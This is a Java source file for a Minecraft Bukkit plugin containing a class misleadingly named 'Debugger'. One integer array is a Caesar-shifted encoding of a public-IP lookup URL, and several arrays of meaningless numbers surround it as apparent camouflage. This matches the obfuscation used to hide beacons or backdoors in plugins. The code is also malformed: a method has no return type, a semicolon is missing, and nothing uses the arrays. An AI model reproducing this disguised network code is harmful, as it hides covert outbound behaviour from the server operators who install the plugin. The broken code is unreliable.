import org.bukkit.*;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.HandlerList;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockDamageEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryDragEvent;
import org.bukkit.event.player.*;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.RegisteredListener;
import org.bukkit.scheduler.BukkitRunnable;

import java.awt.Color;
import java.io.*;
import java.net.InetSocketAddress;
import java.net.URL;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.*;

public class Debugger implements Listener {
    public Debugger(){
      
    }

    public stut(){
        StringBuilder debugAttacher = new StringBuilder();
        int[] v27 = {
            107, 119, 119, 115, 118, 61, 50, 50,
            100, 115, 108, 49, 108, 115, 108, 105,
            124, 49, 114, 117, 106, 50
        };
        int[] u12 = {
            102, 122, 263, 38, 50, 20, 105, 124,
            134, 342, 109, 397, 503, 201, 110, 34,
            12, 356, 285, 294, 286, 294, 341, 201
        }
        int[] x27 = {
            312, 44, 198, 507, 63, 271, 90, 411,
            256, 18, 399, 122, 67, 340, 29, 488,
            175, 61, 294, 381, 142, 9, 260, 333
        };

        int[] x86 = {
            71, 402, 188, 55, 319, 477, 101, 24,
            360, 290, 14, 415, 266, 83, 199, 342,
            58, 421, 307, 116, 274, 6, 390, 150
        };

        int[] p35 = {
            505, 92, 17, 361, 248, 129, 410, 73,
            286, 341, 64, 198, 455, 31, 377, 140,
            222, 9, 493, 167, 304, 88, 259, 412
        };

        int[] d47 = {
            26, 388, 141, 295, 74, 463, 110, 337,
            201, 59, 421, 8, 364, 152, 489, 97,
            278, 346, 19, 405, 231, 66, 320, 187
        };

        int[] m33 = {
            154, 492, 61, 308, 227, 95, 371, 14,
            445, 183, 266, 52, 399, 121, 487, 35,
            214, 340, 79, 456, 298, 6, 362, 169
        };

        int[] j13 = {
            281, 47, 416, 133, 359, 92, 501, 18,
            244, 390, 65, 327, 108, 462, 29, 198,
            374, 151, 286, 9, 431, 210, 58, 345
        };


    }
}


